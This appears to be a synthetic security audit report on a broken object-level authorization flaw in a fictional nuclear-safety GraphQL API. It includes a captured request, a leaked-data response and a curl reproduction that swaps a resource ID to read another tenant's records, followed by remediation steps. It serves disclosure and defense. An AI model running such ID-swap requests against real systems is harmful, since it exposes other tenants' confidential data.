# Security Analysis Report
**System:** ReactorCore Safety API (Nuclear / Safety Systems)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0240 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User / Pattern 10.1 | ID swap in own request — attacker substitutes resource ID to access cross-tenant nuclear safety system data |

---

## Finding 1 — ID Swap: Cross-Tenant Nuclear Safety Data Access (CRITICAL)

### Summary
The `getResource` resolver on ReactorCore Safety API (`api.reactorcore-safety-a.example.com`) fetches by `resourceId` only, with no JWT `tenantId` ownership check (§4.0 RISK-GQL-240). Per §5.0 Pattern 10.1, this ID swap attack is the simplest form of BOLA: the attacker simply substitutes `R-2240` (a different tenant's resource) in what is otherwise their own valid request structure. In a nuclear safety system, this exposes reactor operational parameters, safety system configurations, and maintenance records belonging to `tenant-55d6` — data whose unauthorized exposure constitutes a critical national security and safety risk.

**Pattern:** 10.1 — ID swap in own request (Single-User)
**Affected resolver:** `getResource(id: ID!): Resource`
**Affected endpoint:** `POST https://api.reactorcore-safety-a.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-1fd1`):**
```
POST https://api.reactorcore-safety-a.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-1fd1

{"query": "query VulnerableOp { getResource(id: \"R-2240\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-55d6",
      "ownerId": "other-user-1fd155d6",
      "data": {"sensitiveField": "CONFIDENTIAL-1fd155d6", "internalNotes": "Internal data exposed"}
    }
  }
}
```

**x-request-id:** `req-1fd155d6`

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 RISK-GQL-240 | Resolver gap | No `tenantId` check | Root cause |
| §5.0 Pattern 10.1 | Vulnerability | ID swap in own request | Classification |
| HAR request | `id` | `R-2240` | Swapped to victim's nuclear resource |
| HAR request | `x-tenant-id` | `tenant-1fd1` | Attacker tenant |
| HAR response | `tenantId` | `tenant-55d6` | Victim confirmed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-1fd155d6` | Nuclear safety data |
| HAR headers | `x-request-id` | `req-1fd155d6` | Correlation ID |

### Steps to Reproduce
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST https://api.reactorcore-safety-a.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-1fd1" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { getResource(id: \"R-2240\") { resourceId tenantId data { sensitiveField internalNotes } } }"}' \
  | jq '.data.getResource'
# VULNERABLE: tenantId=tenant-55d6, sensitiveField=CONFIDENTIAL-1fd155d6
```

### Remediation
1. Resolver ownership check: `if (resource.tenantId !== context.auth.tenantId) throw ForbiddenError()`
2. Apply the fix to ALL resolvers: `getResource`, `getResourceWithChildren`, `updateResource`, `deleteResource`, `bulkResourceLookup`.
3. Fix Redis cache key with `tenantId` (§2.0).
4. **Nuclear/Safety critical:** IAEA nuclear security guidance and NIS2 apply — unauthorized access to reactor safety data must be reported and investigated immediately; implement mandatory access audit logging.
